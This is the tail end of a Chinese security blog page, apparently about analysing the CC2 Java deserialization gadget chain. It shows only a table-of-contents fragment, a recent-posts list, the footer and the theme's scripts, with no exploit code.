href="#%E7%94%9F%E6%88%90%E5%AD%97%E8%8A%82%E7%A0%81toBytecode"><span class="toc-number">4.1.5.</span> <span class="toc-text">生成字节码toBytecode()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%AF%B9%E8%B1%A1toClass"><span class="toc-number">4.1.6.</span> <span class="toc-text">生成对象toClass()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0demo"><span class="toc-number">4.1.7.</span> <span class="toc-text">简单实现demo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PriorityQueue%E4%BC%98%E5%85%88%E7%BA%A7%E9%98%9F%E5%88%97"><span class="toc-number">4.2.</span> <span class="toc-text">PriorityQueue优先级队列</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ClassLoader-defineClass"><span class="toc-number">4.3.</span> <span class="toc-text">ClassLoader#defineClass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TemplatesImpl"><span class="toc-number">4.4.</span> <span class="toc-text">TemplatesImpl</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#defineTransletClasses"><span class="toc-number">4.4.1.</span> <span class="toc-text">defineTransletClasses()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getTransletInstance"><span class="toc-number">4.4.2.</span> <span class="toc-text">getTransletInstance()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#newTransformer"><span class="toc-number">4.4.3.</span> <span class="toc-text">newTransformer()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getOutputProperties"><span class="toc-number">4.4.4.</span> <span class="toc-text">getOutputProperties()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E9%93%BE"><span class="toc-number">4.4.5.</span> <span class="toc-text">完整链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0demo"><span class="toc-number">4.4.6.</span> <span class="toc-text">实现demo</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04%E3%80%81CC2%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text">0x04、CC2利用链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E6%8E%A8%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">5.1.</span> <span class="toc-text">逆推调用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E5%88%86%E6%9E%90%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">5.2.</span> <span class="toc-text">正向分析调用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">5.3.</span> <span class="toc-text">完整利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC%E6%9E%84%E9%80%A0"><span class="toc-number">5.4.</span> <span class="toc-text">POC构造</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05%E3%80%81CC2-yso%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">6.</span> <span class="toc-text">0x05、CC2-yso利用链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E7%AE%80%E8%BF%B0"><span class="toc-number">6.1.</span> <span class="toc-text">分析简述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0POC"><span class="toc-number">6.2.</span> <span class="toc-text">构造POC</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">7.</span> <span class="toc-text">0x06、总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07%E3%80%81%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">8.</span> <span class="toc-text">0x07、参考链接</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/7e30cd4a.html" title="java安全-CC2链学习与分析">java安全-CC2链学习与分析</a><time datetime="2022-11-29T06:36:59.000Z" title="发表于 2022-11-29 14:36:59">2022-11-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/dd664be3.html" title="java安全-CC1链学习与分析">java安全-CC1链学习与分析</a><time datetime="2022-11-09T06:36:59.000Z" title="发表于 2022-11-09 14:36:59">2022-11-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/643c7e53.html" title="java安全-URLDNS链学习与分析">java安全-URLDNS链学习与分析</a><time datetime="2022-10-25T07:36:59.000Z" title="发表于 2022-10-25 15:36:59">2022-10-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/7a787d86.html" title="java安全-初识java反射">java安全-初识java反射</a><time datetime="2022-10-18T07:36:59.000Z" title="发表于 2022-10-18 15:36:59">2022-10-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/777da932.html" title="记一次普通的攻击溯源排查">记一次普通的攻击溯源排查</a><time datetime="2022-10-11T15:00:00.000Z" title="发表于 2022-10-11 23:00:00">2022-10-11</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/bg3.png')"><div id="footer-wrap"><div class="copyright">&copy;2022 By Okaytc</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '5WzQHrZA6gNtoCZa9qWZkFjv-gzGzoHsz',
      appKey: 'O1mOg3eUPYzPIUYEaX54ip6s',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="富强,民主,文明,和谐,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>